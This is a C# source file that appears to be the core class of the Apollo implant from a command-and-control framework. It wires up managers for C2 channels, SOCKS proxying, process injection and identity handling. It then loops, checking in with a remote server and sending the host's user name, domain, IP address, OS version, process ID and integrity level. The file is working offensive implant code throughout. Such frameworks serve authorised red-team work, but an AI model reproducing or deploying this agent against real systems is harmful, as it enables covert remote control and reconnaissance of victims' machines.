using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using ApolloInterop.Classes;
using AM = Apollo.Management;
using Apollo.Api;
using Apollo;
using System.Reflection;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using Microsoft.Win32;

namespace Apollo.Agent
{
    public class Apollo : ApolloInterop.Classes.Agent
    {

        public Apollo(string uuid) : base(uuid)
        {
            Api = new Api.Api();
            C2ProfileManager = new AM.C2.C2ProfileManager(this);
            PeerManager = new AM.Peer.PeerManager(this);
            SocksManager = new AM.Socks.SocksManager(this);
            TaskManager = new AM.Tasks.TaskManager(this);
            FileManager = new AM.Files.FileManager(this);
            IdentityManager = new AM.Identity.IdentityManager(this);
            ProcessManager = new Process.ProcessManager(this);
            InjectionManager = new Injection.InjectionManager(this);

            foreach (string profileName in Config.EgressProfiles.Keys)
            {
                var map = Config.EgressProfiles[profileName];

                var crypto = CreateType(map.TCryptography, new object[] { Config.PayloadUUID, Config.StagingRSAPrivateKey });
                var serializer = CreateType(map.TSerializer, new object[] { crypto });
                var c2 = CreateType(map.TC2Profile, new object[]
                {
                    map.Parameters,
                    (ISerializer)serializer,
                    this
                });

                C2ProfileManager.AddEgress((IC2Profile)c2);
            }

            if (C2ProfileManager.GetEgressCollection().Length == 0)
            {
                throw new Exception("No egress profiles specified.");
            }

            foreach (string profileName in Config.IngressProfiles.Keys)
            {
                var map = Config.EgressProfiles[profileName];

                var crypto = CreateType(map.TCryptography, new object[] { Config.PayloadUUID, Config.StagingRSAPrivateKey });
                var serializer = CreateType(map.TSerializer, new object[] { crypto });
                var c2 = CreateType(map.TC2Profile, new object[]
                {
                    map.Parameters,
                    (ISerializer)serializer,
                    this
                });

                C2ProfileManager.AddIngress((IC2Profile)c2);
            }
        }

        public override void Start()
        {
            while (Alive)
            {
                if (Checkin())
                {
                    IC2Profile[] c2s = C2ProfileManager.GetConnectedEgressCollection();
                    foreach(var c2 in c2s)
                    {
                        c2.Start();
                    }
                }
            }
        }

        private static string GetIP()
        {
            return Dns.GetHostEntry(
                Dns.GetHostName()).AddressList.FirstOrDefault(
                    ip => ip.AddressFamily == AddressFamily.InterNetwork
                ).ToString();
        }

        private static string GetOSVersion()
        {
            return Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "").ToString() + " " + Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ReleaseId", "");
        }

        private bool Checkin()
        {
            CheckinMessage msg = new CheckinMessage()
            {
                Action = "checkin",
                OS = $"{GetOSVersion()} {Environment.OSVersion.Version}",
                User = Environment.UserName,
                Host = Dns.GetHostName(),
                PID = System.Diagnostics.Process.GetCurrentProcess().Id,
                ProcessName = System.Diagnostics.Process.GetCurrentProcess().ProcessName,
                IP = GetIP(),
                UUID = UUID,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                Domain = Environment.UserDomainName,
                // Modify this later.
                IntegrityLevel = IdentityManager.GetIntegrityLevel(),
                ExternalIP = "",
            };
            IC2Profile connectProfile = null;
            bool bRet = false;
            foreach(var profile in C2ProfileManager.GetEgressCollection())
            {
                try
                {
                    if (profile.Connect(msg, delegate (MessageResponse r)
                    {
                        connectProfile = profile;
                        UUID = r.ID;
                        bRet = true;
                        return bRet;
                    }))
                    {
                        break;
                    }
                } catch(Exception ex)
                {
                    
                }
            }
            return bRet;

        }

        private object CreateType(Type t, object[] args)
        {
            var ctors = t.GetConstructors();
            return ctors[0].Invoke(args);
        }

        public override void Exit()
        {
            base.Exit();
        }
    }
}
